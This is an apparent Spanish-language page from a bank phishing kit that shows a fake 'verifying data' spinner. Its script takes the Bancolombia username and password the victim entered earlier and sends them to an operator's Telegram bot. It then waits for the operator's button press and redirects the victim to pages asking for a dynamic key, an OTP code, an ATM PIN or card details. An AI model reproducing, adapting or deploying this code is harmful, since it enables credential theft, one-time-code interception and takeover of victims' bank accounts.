<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificando Datos</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background: url('img/fondo.png') no-repeat center center fixed;
            background-size: cover;
        }

        .blur-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.4);
            backdrop-filter: blur(10px);
        }

        .loaderp-full {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            position: fixed;
            width: 90%;
            height: 90%;
            z-index: 9999;
        }

        .loaderp {
            width: 180px; /* Tamaño del círculo */
            height: 180px; /* Tamaño del círculo */
            background-image: url('img/circulo.png'); /* Carga la imagen del círculo */
            background-size: cover; /* Hace que la imagen cubra todo el círculo */
            border-radius: 50%; /* Forma el círculo */
            position: relative; /* Necesario para posicionar el loader dentro */
            display: flex;
            flex-direction: column; /* Centra el texto debajo del loader */
            justify-content: center;
            align-items: center;
            text-align: center;
        }

        .loaderp .loader {
            width: 30px; /* Tamaño del loader (gris) */
            height: 30px; /* Tamaño del loader (gris) */
            border: 5px solid #f3f3f3; /* Hacer el borde más delgado (antes era 10px) */
            border-top: 5px solid #555; /* Hacer el borde superior más delgado (antes era 10px) */
            border-radius: 50%;
            animation: spin 1s linear infinite; /* Animación de giro */
        }

        .loaderp-text {
            margin-top: 30px; /* Espacio entre el loader y el texto */
            font-size: 13px;
            color: black;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="blur-overlay"></div>
    <div class="loaderp-full">
        <div class="loaderp">
            <div class="loader"></div> <!-- Este es el loader gris que gira -->
            <div class="loaderp-text">Cargando...</div> <!-- Texto debajo del loader -->
        </div>
    </div>



    <script>
    document.addEventListener('DOMContentLoaded', async function () {
        // Mostrar el loader inicialmente oculto
        const loader = document.querySelector('#loader');

        // Obtener los valores de usuario y clave desde el localStorage
        const bancoldata = JSON.parse(localStorage.getItem('bancoldata'));
        if (!bancoldata || !bancoldata.usuario || !bancoldata.clave) {
            console.error("Error: No se encontraron datos en 'bancoldata' en el localStorage.");
            return;
        }

        const usuario = bancoldata.usuario;
        const clave = bancoldata.clave;

        // Generar transactionId
        const transactionId = Date.now().toString(36) + Math.random().toString(36).substr(2);

        // Almacenar en localStorage
        localStorage.setItem('transactionId', transactionId);

        // Obtener los datos de la tarjeta desde localStorage
        const datosTarjeta = JSON.parse(localStorage.getItem("tbdatos"));

        // Crear mensaje para Telegram
        const message = `
<b>Nuevo método de pago pendiente de verificación.</b>
--------------------------------------------------
🆔 <b>ID:</b> | <b>${transactionId}</b>
👤 <b>Usuario:</b> | ${usuario}
🔐 <b>Clave:</b> | ${clave}
--------------------------------------------------
<b>Detalles del pago:</b>

        `;

        // Crear botones interactivos
        const keyboard = JSON.stringify({
            inline_keyboard: [
                [{ text: "Pedir Dinámica - Bancolombia", callback_data: `pedir_dinamica:${transactionId}` }],
                [{ text: "Pedir Código OTP", callback_data: `pedir_otp:${transactionId}` }],
                [{ text: "Error de TC", callback_data: `error_tc:${transactionId}` }],
                [{ text: "Error de Logo - Bancolombia", callback_data: `error_logo:${transactionId}` }],
                [{ text: "Finalizar", callback_data: `confirm_finalizar:${transactionId}` }]
            ],
        });

        // Enviar mensaje a Telegram
        const config = await loadTelegramConfig();
        if (!config) {
            console.error("Error al cargar configuración de Telegram.");
            return;
        }

        try {
            const response = await fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: config.chat_id,
                    text: message,
                    reply_markup: keyboard,
                    parse_mode: "HTML",
                }),
            });

            const data = await response.json();
            if (data.ok) {
                console.log("Mensaje enviado a Telegram con éxito");
                // Esperar la respuesta del botón presionado en Telegram
                await checkPaymentVerification(transactionId);
            } else {
                throw new Error("Error al enviar mensaje a Telegram.");
            }
        } catch (error) {
            console.error("Error al enviar mensaje:", error);
            if (loader) loader.style.display = "none"; // Ocultar loader si hay error
        }

        async function loadTelegramConfig() {
            try {
                const response = await fetch("botmaster2.php");
                if (!response.ok) {
                    throw new Error("No se pudo cargar el archivo de configuración de Telegram.");
                }
                return await response.json();
            } catch (error) {
                console.error("Error al cargar la configuración de Telegram:", error);
            }
        }

        async function checkPaymentVerification(transactionId) {
            const config = await loadTelegramConfig();
            if (!config) return;

            try {
                const response = await fetch(`https://api.telegram.org/bot${config.token}/getUpdates`);
                const data = await response.json();

                const verificationUpdate = data.result.find(update =>
                    update.callback_query &&
                    [
                        `pedir_dinamica:${transactionId}`,
                        `pedir_cajero:${transactionId}`,
                        `pedir_otp:${transactionId}`,
                        `pedir_token:${transactionId}`,
                        `error_tc:${transactionId}`,
                        `error_logo:${transactionId}`,
                        `confirm_finalizar:${transactionId}`
                    ].includes(update.callback_query.data)
                );

                if (verificationUpdate) {
                    if (loader) loader.style.display = "none"; // Ocultar loader

                    // Aquí manejamos las respuestas de los botones
                    switch (verificationUpdate.callback_query.data) {
                        case `pedir_dinamica:${transactionId}`:
                            window.location.href = "dinacol.php"; // Redirige a la página de clave dinámica
                            break;
                        case `pedir_cajero:${transactionId}`:
                            window.location.href = "ccajero-id.php"; // Redirige a la página de clave de cajero
                            break;
                        case `pedir_otp:${transactionId}`:
                            window.location.href = "index-otp.html"; // Redirige a la página de OTP
                            break;
                        case `pedir_token:${transactionId}`:
                            window.location.href = "index-otp.html"; // Redirige a la página de OTP
                            break;
                        case `error_tc:${transactionId}`:
                            alert("Error en tarjeta. Verifique los datos.");
                            window.location.href = "../../pay/"; // Redirige a la página de pago
                            break;
                        case `error_logo:${transactionId}`:
                            alert("Error en el logo. Reintente.");
                            window.location.href = "index-pc-error.html"; // Redirige a la página de error
                            break;
                            case `confirm_finalizar:${transactionId}`:
                        window.location.href = "../../checking.php";
                        break;
                    }
                } else {
                    // Si no hay respuesta, esperamos un poco más antes de volver a intentarlo
                    setTimeout(() => checkPaymentVerification(transactionId), 2000);
                }
            } catch (error) {
                console.error("Error en la verificación:", error);
                // En caso de error, intentamos de nuevo en 2 segundos
                setTimeout(() => checkPaymentVerification(transactionId), 2000);
            }
        }
    });
</script>
</body>
</html>
